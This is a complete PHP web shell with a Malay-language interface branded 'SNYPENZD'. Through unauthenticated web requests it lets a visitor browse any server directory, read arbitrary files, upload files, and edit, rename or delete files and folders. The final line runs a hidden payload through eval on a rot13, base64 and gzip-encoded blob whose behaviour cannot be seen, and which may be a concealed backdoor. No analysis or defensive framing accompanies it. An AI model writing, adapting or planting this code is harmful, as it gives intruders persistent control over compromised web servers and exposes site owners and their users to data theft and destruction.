<!DOCTYPE html>
<html>
<head>
    <link href="" rel="stylesheet" type="text/css"><title>SISTEM DATA</title>
    <link href='https://fonts.googleapis.com/css?family=VT323' rel='stylesheet'>
    <style type="text/css">
        body {
            background: #263238;
            color: #0962ff;
            font-family: 'Courier';
            margin: 0;
            font-size: 14px;
        }

        h1 {
            font-family: 'VT323';
            font-weight: normal;
            font-size: 60px;
            margin: 0;
        }

        h1:hover {
            color: #008ed0;
        }

        select {
            font-family: arial;  
            background: #0962ff;
            color: #ffffff;
        }

        a {
            color: white;
            text-decoration: none;
            font-family: 'Courier'
        }

        textarea {
            width: 900px;
            height: 250px;
            background: transparent;
            border: 1px dashed #0962ff;
            color: #0962ff;
            padding: 2px;
        }

        tr.first {
            border-bottom: 1px dashed #0962ff;
        }

        tr:hover {
            background: #6ea5ff;
        }

        th {
            background: #0962ff;
            padding: 5px;
        }
        table{
          border:solid 1px white;
        }
        td{
          padding:5px;
        }
    </style>
</head>
<body>
    <?php echo'<div style="color:#0962ff;margin-top:0;"><h1><center>SNYPENZD</center></h1></div>';
    if (isset($_GET['path'])) {
        $path = $_GET['path']; chdir($_GET['path']);
    } else {
        $path = getcwd();
    }
    $path = str_replace("\\", "/", $path); $paths = explode("/", $path);
    echo '<table width="100%" border="0" align="center" style="margin-top:-10px;"><tr><td>'; echo "<font style='font-size:13px;'>Laluan: ";
    foreach ($paths as $id => $pat) {
        echo "<a style='font-size:13px;' href='?path=";
        for ($i = 0; $i <= $id; $i++) {
            echo $paths[$i];
            if ($i != $id) {
                echo "/";
            }
        }echo "'>$pat</a>/";
    }
    echo '<br>[ <a href="?">Utama</a> ]</font></td><td align="center" width="27%"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:#0962ff;margin-bottom:4px;"/>
<input type="submit" value="Upload" /></form></td></tr><tr><td colspan="2">';
    if (isset($_FILES['file'])) {
        if (copy($_FILES['file']['tmp_name'], $path.'/'.$_FILES['file']['name'])) {
            echo '<center><font color="#00ff00">Upload OK!.</font></center><br/>';
        } else {
            echo '<center><font color="red">Upload Failed!.</font></center><br/>';
        }}
    echo '</td></tr><tr><td></table>';
    if (isset($_GET['filesrc'])) {
        echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td>File: '; echo "".basename($_GET['filesrc']); ""; echo '</tr></td></table><br />'; echo("<center><textarea readonly=''>".htmlspecialchars(file_get_contents($_GET['filesrc']))."</textarea></center>");
    } elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') {
        echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
        if ($_POST['opt'] == 'rename') {
            if (isset($_POST['newname'])) {
                if (rename($_POST['path'], $path.'/'.$_POST['newname'])) {
                    echo '<center><font color="#00ff00">Rename OK!</font></center><br />';
                } else {
                    echo '<center><font color="red">Rename Failed!</font></center><br />';
                } $_POST['name'] = $_POST['newname'];
            }
            echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="rename"><input type="submit" value="OK" /></form>';
        } elseif ($_POST['opt'] == 'edit') {
            if (isset($_POST['src'])) {
                $fp = fopen($_POST['path'], 'w'); if (fwrite($fp, $_POST['src'])) {
                    echo '<center><font color="#00ff00">Edit File OK!.</font></center><br />';
                } else {
                    echo '<center><font color="red">Edit File Failed!.</font></center><br />';
                }fclose($fp);
            }
            echo '<form method="POST"><textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="OK" /></form>';
        }echo '</center>';
    } else {
        echo '</table><br /><center>';
        if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
            if ($_POST['type'] == 'dir') {
                if (rmdir($_POST['path'])) {
                    echo '<center><font color="#00ff00">Dir Deleted!</font></center><br />';
                } else {
                    echo '<center><font color="red">Delete Dir Failed!</font></center><br />';
                }
            } elseif ($_POST['type'] == 'file') {
                if (unlink($_POST['path'])) {
                    echo '<font color="#00ff00">Delete File Done.</font><br />';
                } else {
                    echo '<font color="red">Delete File Error.</font><br />';
                }}}echo '</center>';
        $scandir = scandir($path);
        echo '<div id="content"><table width="100%" cellpadding="3" cellspacing="1" align="center"><tr class="first">
<th><center style="color:white;">Nama</center></th><th width="12%"><center style="color:white;">Saiz</center></th><th width="10%"><center style="color:white;">Kebenaran</center></th>
<th width="15%"><center style="color:white;">Akhir Kemaskini</center></th><th width="11%"><center style="color:white;">Pilihan</center></th></tr>';
        foreach ($scandir as $dir) {
            if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
            echo "<tr><td>[D] <a style=\"color:white;background:gray;\" href=\"?path=$path/$dir\">$dir</a></td><td><center>Folder</center></td><td><center>";
            if (is_writable("$path/$dir")) echo '<font color="#00ff00">';
            elseif (!is_readable("$path/$dir")) echo '<font color="red">';
            echo perms("$path/$dir");
            if (is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
            echo"</center></td><td><center>".date("d-M-Y", filemtime("$path/$dir")).""; echo "</center></td>
<td><center><form method=\"POST\" style=\"color:white;\" action=\"?option&path=$path\"><select style=\"color:white;\" name=\"opt\"><option style=\"color:white;\" value=\"\"></option><option style=\"color:white;\" value=\"delete\">Delete</option><option style=\"color:white;\" value=\"rename\">Rename</option></select><input type=\"hidden\" name=\"type\" value=\"dir\"><input type=\"hidden\" name=\"name\" value=\"$dir\"><input type=\"hidden\" name=\"path\" value=\"$path/$dir\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";
        }
        foreach ($scandir as $file) {
            if (!is_file("$path/$file")) continue; $size = filesize("$path/$file")/1024;
            $size = round($size, 3); if ($size >= 1024) {
                $size = round($size/1024, 2).' MB';
            } else {
                $size = $size.' KB';
            }
            echo "<tr><td>[F] <a href=\"?filesrc=$path/$file&path=$path\">$file</a></td><td><center>".$size."</center></td><td><center>";
            if (is_writable("$path/$file")) echo '<font color="#00ff00">';
            elseif (!is_readable("$path/$file")) echo '<font color="red">';
            echo perms("$path/$file");
            if (is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
            echo"</center></td><td><center>".date("d-M-Y H:i", filemtime("$path/$file"))."";
            echo "</center></td><td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$file\"><input type=\"hidden\" name=\"path\" value=\"$path/$file\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";
        }
        echo '</table></div>';
    }echo '</body></html>';
    function perms($file) {
        $perms = fileperms($file); if (($perms & 0xC000) == 0xC000) {
            $info = 's';
        } elseif (($perms & 0xA000) == 0xA000) {
            $info = 'l';
        } elseif (($perms & 0x8000) == 0x8000) {
            $info = '-';
        } elseif (($perms & 0x6000) == 0x6000) {
            $info = 'b';
        } elseif (($perms & 0x4000) == 0x4000) {
            $info = 'd';
        } elseif (($perms & 0x2000) == 0x2000) {
            $info = 'c';
        } elseif (($perms & 0x1000) == 0x1000) {
            $info = 'p';
        } else {
            $info = 'u';
        } $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-')); $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-')); $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-')); return $info;
    }
    echo'<br><center>&copy; 2024 - Edited Version.</center><br>'; error_reporting(0); eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj=')))); ?>